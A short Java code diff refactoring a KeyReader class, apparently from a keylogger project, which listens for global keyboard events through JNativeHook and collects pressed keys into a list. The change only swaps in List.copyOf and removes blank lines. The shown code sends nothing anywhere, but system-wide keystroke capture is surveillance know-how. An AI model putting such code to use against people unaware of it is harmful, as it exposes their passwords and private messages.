@@ -32,24 +32,20 @@ public class KeyReader implements NativeKeyListener {
       }
 
       public List<String> getCollectedKeys() {
-            List<String> result = new ArrayList<>(readSigns);
+            List<String> result = List.copyOf(readSigns);
             readSigns.clear();
             return result;
       }
 
       private void collectKeyEvent(NativeKeyEvent nativeKeyEvent, boolean keyPressed) {
             String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
-
             if (keyPressed) {
-
                   if (isSpace(keyText)) {
                         keyText = SPACE;
                   }
-
                   if (isShift(keyText)) {
                         keyText = generateShiftEntry(KeyLoggerEntries.SHIFT_PRESSED);
                   }
-
                   readSigns.add(keyText);
             } else {
                   if (isShift(keyText)) {
@@ -70,5 +66,4 @@ public class KeyReader implements NativeKeyListener {
       private boolean isShift(String keyText) {
             return keyText.equalsIgnoreCase("shift");
       }
-
 }
